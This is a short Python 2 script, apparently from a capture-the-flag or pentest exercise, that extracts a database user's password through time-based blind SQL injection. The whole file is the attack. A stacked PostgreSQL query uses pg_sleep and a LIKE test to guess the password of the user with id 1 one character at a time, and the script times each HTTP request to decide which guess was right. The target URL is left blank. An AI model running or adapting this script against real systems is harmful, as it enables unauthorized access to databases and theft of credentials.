import requests
import time

url=""
part1="1;SELECT (case when (select password from users where id=1 and password like $$"
part2="%$$ limit 1 offset 0) is not null then (select 1 from pg_sleep(9999)) else 2 end)--"
alphabet="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@<>:,.-?!$*^()~\\_"

result=""
longueur=len(alphabet)
finish=0

while finish==0 :
	for i in range(0,longueur) :
		finish=1
		requestTemp=url+part1+result+alphabet[i:(i+1)]+part2
		start=time.time()
		r = requests.get(requestTemp)
		roundtrip = time.time() - start
		print result+alphabet[i:(i+1)]+" : "+str(roundtrip)
		if roundtrip>1 :
			result=result+alphabet[i:(i+1)]
			finish=0
			break
